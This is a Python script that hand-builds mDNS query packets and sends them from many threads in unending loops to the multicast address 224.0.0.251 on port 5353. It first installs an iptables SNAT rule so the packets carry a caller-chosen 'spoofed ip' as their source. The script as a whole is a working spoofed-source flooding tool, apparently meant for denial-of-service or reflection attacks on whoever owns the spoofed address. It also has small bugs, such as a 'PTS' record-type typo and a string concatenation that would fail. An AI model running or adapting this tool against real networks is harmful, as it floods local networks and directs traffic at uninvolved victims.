import signal
import os
import sys
import argparse
import threading
import time
import binascii
import socket

multicast_add = "224.0.0.251"
mdns_port = 5353

def get_type(type):
	types = [
		"ERROR", # type 0 does not exist
		"A",
		"NS",
		"MD",
		"MF",
		"CNAME",
		"MB",
		"MG",
		"MR",
		"NULL",
		"WKS",
		"PTS",
		"HINFO",
		"MINFO",
		"TXT"
	]

	return "{:04x}".format(types.index(type)) if isinstance(type, str) else types[type]

def build_message(type="A", address=""):
	ID = 0 # RFC says it should be 0 in trasmission

	QR = 0	    # Query: 0, Response: 1	1bit
	OPCODE = 0  # Standard query		4bit
	AA = 0	    # ?				1bit
	TC = 0	    # Message is truncated?	1bit
	RD = 0	    # Recursion?		1bit
	RA = 0	    # ?				1bit
	Z = 0	    # ?				3bit
	RCODE = 0   # ?				4bit

	query_params = str(QR)
	query_params += str(OPCODE).zfill(4)
	query_params += str(AA) + str(TC) + str(RD) + str(RA)
	query_params += str(Z).zfill(3)
	query_params += str(RCODE).zfill(4)
	query_params = "{:04x}".format(int(query_params, 2))

	QDCOUNT = 1 # Number of questions		4bit
	ANCOUNT = 0 # Number of answers			4bit
	NSCOUNT = 0 # Number of authority records	4bit
	ARCOUNT = 0 # Number of additional records	4bit

	message = ""
	message += "{:04x}".format(ID)
	message += query_params
	message += "{:04x}".format(QDCOUNT)
	message += "{:04x}".format(ANCOUNT)
	message += "{:04x}".format(NSCOUNT)
	message += "{:04x}".format(ARCOUNT)

	# QNAME is url split up by '.', preceded by int indicating length of part
	addr_parts = address.split(".")
	for part in addr_parts:
		addr_len = "{:02x}".format(len(part))
		addr_part = binascii.hexlify(part.encode())
		message += addr_len
		message += addr_part.decode()

	message += "00" # Terminating bit for QNAME

	# Type of request
	QTYPE = get_type(type)
	message += QTYPE

	# Class for lookup. 1 is Internet
	QCLASS = 1
	message += "{:04x}".format(QCLASS)

	return message

def send_query(host, RRtype, sock, stop_event):	
	try:
		while not stop_event.is_set():
			message = build_message(RRtype, host)
			message = message.replace(" ", "").replace("\n", "") 
			sock.sendto(binascii.unhexlify(message), (multicast_add, mdns_port))
	except Exception as e:
		print(e)

def __main__():
	parser = argparse.ArgumentParser()
	parser.add_argument("--target", "-t", help="Set the .local target")
	parser.add_argument("--type", "-rr", help="Set the RR type to query")
	parser.add_argument("--nthreads", "-nt", help="Set the number of threads to use")
	parser.add_argument("--spoofed-ip", "-i", help="Set the spoofed ip.")
	args = parser.parse_args()

	if len(sys.argv) != 9:
		parser.print_help(sys.stderr)
		sys.exit(1)
		
	os.system(f"sudo iptables -t nat -A POSTROUTING -j SNAT --to-source {args.spoofed_ip}")
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	stop_event = threading.Event()
	
	try:
		print("Loading threads....\n")
		for i in range(int(args.nthreads)):
			t = threading.Thread(target=send_query, args=[args.target,args.type, sock, stop_event])
			t.daemon = True
			t.start()
		
		print("Active Threads: "+threading.active_count()+"\n")
		while True:
			time.sleep(0.5)
	except KeyboardInterrupt:
		print("Quitting...\n")
		stop_event.set()
		time.sleep(1)
		sock.close()
	finally:
		os.system(f"sudo iptables -t nat -D POSTROUTING -j SNAT --to-source {args.spoofed_ip}")

if __name__ == "__main__":
	__main__()
	
